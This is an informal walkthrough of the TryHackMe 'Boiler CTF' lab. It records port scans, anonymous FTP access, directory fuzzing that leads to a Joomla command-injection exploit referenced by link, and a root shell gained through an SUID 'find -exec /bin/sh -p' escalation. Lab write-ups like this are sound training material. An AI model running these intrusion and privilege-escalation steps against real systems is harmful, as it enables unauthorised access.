*** Just a tricky box ***
___________________________________
# nmap
```
┌──(kali㉿kali)-[~/THM/Boiler CTF]
└─$ nmap -p- 10.48.141.176 --min-rate=1000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 14:26 -0500
Nmap scan report for 10.48.141.176
Host is up (0.056s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt
55007/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 36.29 seconds
```
____________________________________________________________________________________________________________________________________________

[ Second Scan]
```
┌──(kali㉿kali)-[~/THM/Boiler CTF]
└─$ nmap -p21,80,10000,55007 -A 10.48.141.176 --min-rate=1000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 14:28 -0500
Nmap scan report for 10.48.141.176
Host is up (0.056s latency).

PORT      STATE    SERVICE          VERSION
21/tcp    open     ftp              vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.199.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open     http             Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp filtered snet-sensor-mgmt
55007/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (96%), Linux 4.4 (96%), Linux 3.10 - 3.13 (95%), Linux 5.4 (94%), Linux 3.8 - 3.16 (93%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 6.0>
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Unix
TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   54.04 ms 192.168.128.1
2   ...
3   54.43 ms 10.48.141.176

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.01 seconds
```
____________________________________________________________________________________________________________________________________________

# FTP

[ Login Successful ]
```
┌──(kali㉿kali)-[~/THM/Boiler CTF]
└─$ ftp 10.48.141.176
Connected to 10.48.141.176.
220 (vsFTPd 3.0.3)
Name (10.48.141.176:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
____________________________________________________________________________________________________________________________________________
[ Found a file]
```
229 Entering Extended Passive Mode (|||43326|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||41724|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |*************************************************************************************************************************************************************************|    74       78.04 KiB/s    00:00 E>
226 Transfer complete.
```
[ Inside the file we have a text saying "Just wanted to see if you find it.  Lol. Remember: Enumeration is the key!"]

- Further enumerating the higher ports we found a `ssh server` and `webmin` something
____________________________________________________________________________________________________________________________________________

- Fuzzing the endpoint:
    `└─$ ffuf -u http://10.48.141.176/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt`
[ We found an endpoint called joomla ]

- Further Fuzzing that endpoint :
"└─$ ffuf -u http://10.48.141.176/joomla/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt"

-- We found a endpoint called _test which contains a Command Injection vulnerability : https://www.exploit-db.com/exploits/47204
____________________________________________________________________________________________________________________________________________

- Now using this we get access to ssh credentials of the user 'basterd' where in a backup file of the home irectory  we get creds of another user called 'stoner'
[ Do not be confused about the user flag as it is just in an unsual format ]

____________________________________________________________________________________________________________________________________________

# root

- Find SUID files : find / -perm -4000 -type f 2>/dev/null | less
-- First identify obvious ones: nmap, less, vim, perl, python with SUID often lead to root shells via known tricks.
_________________________________________________________________________________

[ We identified find in the previous commaand and using GTFO Bins we get to this conclusion.]
$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
# 

BAHAHAHAHA I LOOKED AT DOCUMENTATION FOR THE PRIV_ESC
